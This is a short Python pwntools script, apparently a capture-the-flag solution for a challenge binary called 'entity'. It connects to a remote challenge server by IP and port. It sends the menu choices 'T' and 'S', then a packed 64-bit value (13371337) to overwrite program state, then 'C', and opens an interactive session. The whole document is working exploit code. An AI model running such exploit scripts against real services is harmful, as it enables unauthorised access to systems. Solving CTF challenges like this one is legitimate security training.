from pwn import *

context.update(arch='amd64', os='linux')
#p = process("./entity")
p = remote('161.35.164.157', 31010)

p.sendline("T")
p.sendline("S")

p.sendline(p64(13371337))
p.sendline("C")

p.interactive()
p.close()
